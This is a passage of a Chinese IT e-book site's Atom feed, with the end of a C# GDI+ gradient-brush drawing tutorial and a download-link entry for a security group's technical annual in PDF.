brush.CenterColor&#160;=&#160;Color.Red;&#160;&#160;//&#160;&#25351;&#23450;&#36335;&#24452;&#20013;&#24515;&#30340;&#39068;&#33394;&#10;&#160; &#160; &#160; &#160; &#160; &#160; brush.SurroundColors&#160;=&#160;new&#160;Color[]&#160;&#123;&#160;Color.Plum&#160;&#125;;&#10;&#160; &#160; &#160; &#160; &#160; &#160; graphics.FillEllipse(brush,&#160;centerPoint.X&#160;-&#160;R,&#160;centerPoint.Y&#160;-&#160;R,&#160;R&#160;*&#160;2,&#160;R&#160;*&#160;2);&#10;&#160; &#160; &#160; &#160; &#160; &#160; centerPoint&#160;=&#160;new&#160;Point(350,&#160;100);&#10;&#160; &#160; &#160; &#160; &#160; &#160; R&#160;=&#160;20;&#10;&#160; &#160; &#160; &#160; &#160; &#160; path&#160;=&#160;new&#160;GraphicsPath();&#10;&#160; &#160; &#160; &#160; &#160; &#160; path.AddEllipse(centerPoint.X&#160;-&#160;R,&#160;centerPoint.Y&#160;-&#160;R,&#160;R&#160;*&#160;2,&#160;R&#160;*&#160;2);&#10;&#160; &#160; &#160; &#160; &#160; &#160; path.AddEllipse(centerPoint.X&#160;-&#160;R&#160;*&#160;2,&#160;centerPoint.Y&#160;-&#160;R&#160;*&#160;2,&#160;R&#160;*&#160;4,&#160;R&#160;*&#160;4);&#10;&#160; &#160; &#160; &#160; &#160; &#160; path.AddEllipse(centerPoint.X&#160;-&#160;R&#160;*&#160;3,&#160;centerPoint.Y&#160;-&#160;R&#160;*&#160;3,&#160;R&#160;*&#160;6,&#160;R&#160;*&#160;6);&#10;&#160; &#160; &#160; &#160; &#160; &#160; brush&#160;=&#160;new&#160;PathGradientBrush(path);&#10;&#160; &#160; &#160; &#160; &#160; &#160; brush.CenterPoint&#160;=&#160;centerPoint;&#10;&#160; &#160; &#160; &#160; &#160; &#160; brush.CenterColor&#160;=&#160;Color.Red;&#10;&#160; &#160; &#160; &#160; &#160; &#160; brush.SurroundColors&#160;=&#160;new&#160;Color[]&#160;&#123;&#160;Color.Black,&#160;Color.Blue,&#160;Color.Green&#160;&#125;;&#10;&#160; &#160; &#160; &#160; &#160; &#160; graphics.FillPath(brush,&#160;path);&#10;&#160; &#160; &#160; &#160; &#125;</span><br></pre></td></tr></table></figure>
<p>上述代码运行效果图如下：</p>
<p><img src="../img/超全面的-donet-gdip-图形图像编程教程/fe1edc718fd47017350fc9d9e1fc037f.jpg" alt=""></p>
<p>哈哈，看到这里，本篇的内容也就讲完了，文章看似很长，其实内容主题也就是GDI+绘图编程了，只是示例代码多了一点点。</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>作者：孤影</p>
<p>来源：<a href="http://www.cnblogs.com/LonelyShadow/p/4162318.html">超全面的 .NET GDI+ 图形图像编程教程</a></p>
</blockquote>
<h2 id="目录">目录</h2><ul>
<li>1 GDI+概述</li>
<li>2 Graphics类<ul>
<li>2.1 Graphics类的方法成员</li>
<li>2.2 引用命名空间</li>
</ul>
</li>
<li>3 常用画图对象<ul>
<li>3.1 Pen类</li>
<li>3.2 Color结构</li>
<li>3.3 Font类</li>
<li>3.4 Brush类</li>
<li>3.5 Rectangle类</li>
</ul>
</li>
<li>4 基本图形绘制举例<ul>
<li>4.1 画一个矩形</li>
<li>4.2 画一个弧</li>
<li>4.3 画线</li>
<li>4.4 画椭圆</li>
<li>4.5 输出文本</li>
<li>4.6 填充路径</li>
</ul>
</li>
<li>5 画刷和画刷类型<ul>
<li>5.1 SolidBrush(单色画刷)</li>
<li>5.2 HatchBrush(阴影画刷)</li>
<li>5.3 TextureBrush(纹理笔刷)</li>
<li>5.4 LinearGradientBrush 和 PathGradientBrush(渐变笔刷)<ul>
<li>5.4.1 LinearGradientBrush类</li>
<li>5.4.2 PathGradientBrush类]]>
    
    </summary>
    
      <category term="csharp" scheme="http://it-ebooks.flygon.net/tags/csharp/"/>
    
      <category term="gdip" scheme="http://it-ebooks.flygon.net/tags/gdip/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[绿色兵团技术年刊]]></title>
    <link href="http://it-ebooks.flygon.net/%E7%BB%BF%E8%89%B2%E5%85%B5%E5%9B%A2%E6%8A%80%E6%9C%AF%E5%B9%B4%E5%88%8A/"/>
    <id>http://it-ebooks.flygon.net/绿色兵团技术年刊/</id>
    <published>2016-02-10T13:43:27.000Z</published>
    <updated>2016-02-10T13:45:05.075Z</updated>
    <content type="html"><![CDATA[<p>格式：PDF</p>
<p>包括2010~2011、2011~2012两部技术年刊。</p>
<h2 id="下载">下载</h2><ul>
<li><a href="http://vdisk.weibo.com/s/aADaW4YRFdArc" target="_blank" rel="external">微盘下载</a></li>
<li><a href="http://1000eb.com/1itkj" target="_blank" rel="external">千易下载</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>格式：PDF</p>
<p>包括2010~2011、2011~2012两部技术年刊。</p>
<h2 id="下载">下载</h2><ul>
<li><a href="http://vdisk.weibo.com/s/aADaW4YRFdArc" target="_blan]]>
    </summary>
    
      <category term="渗透" scheme="http://it-ebooks.flygon.net/tags/%E6%B8%97%E9%80%8F/"/>
    
      <category term="逆向" scheme="http://it-ebooks.flygon.net/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
</feed>
